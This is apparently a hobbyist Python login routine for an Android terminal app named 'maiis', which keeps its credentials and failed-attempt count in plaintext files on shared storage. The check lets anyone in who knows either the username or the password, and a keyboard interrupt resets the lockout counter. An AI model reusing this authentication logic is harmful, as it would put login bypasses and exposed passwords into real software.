def pauser(): # maiis password type agan and agan earror start from here
	try:
		def password():
			blink = '\33[6m'
			bold = '\33[1m'
			selected = '\33[7m'
			url = '\33[4m'
			read='\033[31m'
			green='\033[32m'
			yellow='\033[93m'
			blue='\033[34m'
			bold='\033[01m'
			underline='\033[04m'
			voilet = '\33[35m'
			end = '\33[0m'
			wrong_password_try = 0
			i = 0
			while True:
				try:
					if wrong_password_try ==0:
						os.system('clear')
					with open('/sdcard/Android/data/com.maiis.main.files/usp.txt' , 'r') as op:
						sa = (op.read().find(str('=')))
						op.seek(sa + 2)
						usr_rl = (op.readline())
						sbo = (op.readline().find(str('@')))
						op.seek(sbo + 22)
						passw_rl = (op.readline())
						op.close()
						os.chdir('/sdcard/Android/data/com.maiis.main.files/')
						with open('wp.txt' , 'r') as ol:
							read = ol.readline()
							uy =''.join(x for x in read if x.isdigit())
					
							if uy =='8': # uy is normally in the form of 0 int
								print(read+'pleas confirm your identy'+end)
								confirm_id = input(read+'enter your passcoad : '+end)
								ol.close()
								
			
								with open('pc.txt' , 'r') as pc:
									pco = pc.readline()
									if pco == confirm_id:
										print('')
										with open('/sdcard/Android/data/com.maiis.main.files/wp.txt' , 'w') as wr:
											wr.writelines('0')
										wr.close()
										print(green+'ok id confirmed now restart your maiis'+end)
										break
									else:
										print(read+'pleas try agan id not confirmed'+end)
										time.sleep(1)
									
			
							else:
								ol.close()
								os.chdir('/sdcard/Android/data/com.maiis.main.files/')
								with open('wp.txt' , 'r') as op:
									rea = op.readline()
									i = ''.join(x for x in rea if x.isdigit())
									op.close()
									os.chdir('/sdcard/Android/data/com.maiis.main.files/')
									with open('wp.txt' , 'w') as ip: # trying passwords save to # # # # #  file 
										user=input(yellow+'enter username : '+end+green)
										passw = getpass(yellow+'enter password : '+end)
										os.system('clear')
										i = int(i)
										i = i+1
										io = str(i)
										ip.writelines(io)
										if i ==9:
											print(read+'too many attamts pleas try agan'+end)
											break
										ip.close()
										wrong_password_try = wrong_password_try + 1
										if user==usr_rl+'\n' or passw==passw_rl:
											# wp text file
											with open('wp.txt' , 'w') as wpo: # writing 0 in wp.txt file
												wpo.writelines('0')
												wpo.close()
											maiismain()
										elif wrong_password_try ==1:
											print(read+'Be caire full if you try wrong password agan and agan your system could crash'+end)
										elif wrong_password_try ==8:
											print(read+'sorry too many attampts pleas try agan later'+end)
											break
											exit()
				except KeyboardInterrupt:
					print('')
					os.system('clear')
					with open('wp.txt' , 'w') as dobbty:
						dobbty.writelines('0')
					dobbty.close()
					password()
		password()
	except KeyboardInterrupt:
		print('')
		os.system('clear')
		password()
